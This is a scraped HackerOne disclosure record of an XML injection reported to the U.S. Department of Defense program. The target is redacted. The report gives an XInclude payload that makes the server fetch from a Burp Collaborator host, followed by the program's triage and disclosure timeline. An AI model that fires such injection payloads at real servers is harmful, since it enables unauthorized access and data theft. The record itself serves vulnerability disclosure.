---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/xml-injection
  - env/web
substate: "resolved"
weakness: "XML Injection"
enriched: true
body: true
date: 2021-04-02
submitted: 2020-10-03T23:47:37.995Z
bounty_usd: null
votes: 9
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "fiveguyslover"
source: "https://hackerone.com/reports/997381"
title: "XML Injection on https://www.█████████ (███ parameter)"
---
# XML Injection on https://www.█████████ (███ parameter)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 9 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2021-04-02

- Report: [https://hackerone.com/reports/997381](https://hackerone.com/reports/997381)
- CWE: XML Injection
- Submitted: 2020-10-03T23:47:37.995Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Greetings,

I found an XML injection on https://www.███.
This kind of vulnerability can be difficult to detect and exploit remotely; you should review the application's response
here is the complete link: https://www.███/███████
Payload : 

`███████=<vuc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://9bligh4snzlirzuxt4lbu3zullrbf0.burpcollaborator.net/foo"/></vuc>`

Result : 

███

best regards, 
frenchvlad

## Impact

gaining the access to the unauthorized parts and stealing the sensitive data would be the most important thing to know when it comes to XML’s impact.

## Timeline

- **Report Filed**
- **2020-10-03** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **Report Severity Updated**
- **Report Triaged**
- **2021-01-20** @fiveguyslover: hi there, any updates about this report ?
- **Report Resolved**
- **2021-03-25** @fiveguyslover: is it possible to disclose the report please?
Thank you!
frenchvlad
- **2021-03-25** @agent-l8: On the drop-down box where it says "add comment" there should be an option to request disclosure. Then it goes into our queue and we review and redact it, then disclose if approved. Usually takes about a week or two. Thanks!
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
